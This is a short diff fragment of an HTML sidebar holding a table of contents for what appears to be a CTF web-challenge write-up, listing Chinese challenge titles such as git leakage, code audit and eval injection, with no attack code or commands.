+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-EZwww"><span class="toc-text">1 EZwww</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E6%9C%8B%E5%8F%8B%E7%9A%84%E5%AD%A6%E5%A6%B9"><span class="toc-text">2朋友的学妹</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3Welcome"><span class="toc-text">3Welcome</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4git%E6%B3%84%E9%9C%B2"><span class="toc-text">4git泄露</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E5%88%98%E5%A3%AE%E7%9A%84%E9%BB%91%E9%A1%B5-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">5刘壮的黑页 代码审计</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E6%88%91%E6%98%AF%E5%A4%A7%E9%BB%91%E5%AE%A2eval%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5"><span class="toc-text">6我是大黑客eval漏洞注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7ezbypass"><span class="toc-text">7ezbypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E7%9F%A5X%E5%A0%82%E7%9A%84php%E6%95%99%E7%A8%8B"><span class="toc-text">8知X堂的php教程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9"><span class="toc-text">9</span></a></li></ol>
+    </div>
+  </section>
 
-  
 
   
 
 
 </aside>
+
 
 
         
